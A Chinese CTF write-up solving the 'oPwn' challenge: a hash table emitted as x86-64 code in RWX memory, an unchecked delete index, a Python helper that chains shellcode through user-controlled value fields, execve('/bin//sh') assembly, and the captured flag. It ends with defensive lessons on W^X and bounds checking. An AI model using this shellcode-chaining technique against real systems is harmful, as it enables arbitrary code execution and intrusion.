# oPwn

## 题目简述

WelcomeCTF2021 的 oPwn 实现了一个所谓 $O(1)$ 哈希表：程序在固定地址申请 RWX 内存，并把每个键值对动态编码成一小段 x86-64 机器码。删除接口缺少索引检查，且会把指定条目改写为跳转指令，攻击者可以把受控的键和值字段拼成 shellcode 执行链。

## 解题过程

每个正常条目长 26 字节，主要结构为：

```text
mov rdx, <key>
cmp rdx, rdi
jne next
mov rax, <value>
ret
```

其中 8 字节 `key` 和 8 字节 `value` 都由用户控制，整片 `hashmap` 又具有执行权限。`hashmap_delete(idx)` 不检查 `idx`，会将对应 26 字节填成 NOP，并把开头写为：

```asm
jmp 0x19
```

官方解法先插入两个经过精确排布的条目，使删除第 0 项后的跳转落入后续受控字段，并把多个条目的 `value` 区域串联起来。辅助函数把不超过 6 字节的汇编指令填充到一个 8 字节值中，末尾附加短跳转以进入下一段：

```python
def emit(instruction):
    chunk = asm(instruction).ljust(6, b"\x90") + b"\xeb\x12"
    insert(0xcafebabedeadbeef, u64(chunk))
```

依次写入的指令在栈上构造 `/bin//sh`，清空 `RSI`、`RDX`，设置 `RDI=RSP`、`RAX=59`，最后执行 `syscall`：

```asm
mov ebx, 0x68732f2f
mov eax, 0x6e69622f
shl rbx, 0x20
xor rbx, rax
xor rax, rax
xor rsi, rsi
xor rdx, rdx
push rax
push rbx
mov rdi, rsp
mov al, 0x3b
syscall
```

删除第 0 项并触发一次 lookup 后，控制流沿拼接的代码片段执行 `execve("/bin//sh", NULL, NULL)`，得到：

```text
greyhats{o1_m0r3_l1ke_o(pwn)_hurr_brrr_23311}
```

## 方法总结

本题的问题不只是“内存可执行”，而是同时满足 RWX、固定地址、用户可控机器码字段和无边界删除。JIT 或动态代码生成器必须实施 W^X、严格边界检查和代码模板验证；否则看似结构化的数据操作也能变成任意指令执行。
